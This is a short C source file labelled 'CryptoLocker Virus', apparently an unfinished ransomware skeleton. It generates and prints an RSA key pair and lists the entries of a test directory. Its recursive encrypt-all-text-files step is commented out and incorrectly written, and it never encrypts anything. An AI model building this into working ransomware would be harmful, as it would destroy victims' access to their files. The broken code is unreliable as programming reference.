#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include "rsa.h"
///*CryptoLocker Virus*///

void diveAndEncrypt();

int main(int argc, char **argv){
  struct key_class public[1];
  struct key_class private[1];
  rsa_gen_keys( public, private,PRIME_SOURCE_FILE);
  printKeys(public, private);
  printf("\n");
  diveAndEncrypt("./testDir");

}
// Recursive to dive and Encrypt all Txt docs 
void diveAndEncrypt(char name[256]){
  DIR           *d;
  struct dirent *dir;
  d = opendir(name);
  
  if (d)
  {
    while ((dir = readdir(d)) != NULL)
    {
      printf("%s, %uc\n", dir->d_name, dir->d_type);
      /*      if(dir->d_type=="4c"&& (!(dir->d_name=="."||dir->d_name==".."))){
	name= name+ dir->d_name;
	diveAndEncrypt(name);
	}*/
    }

    closedir(d);
  }
    
}


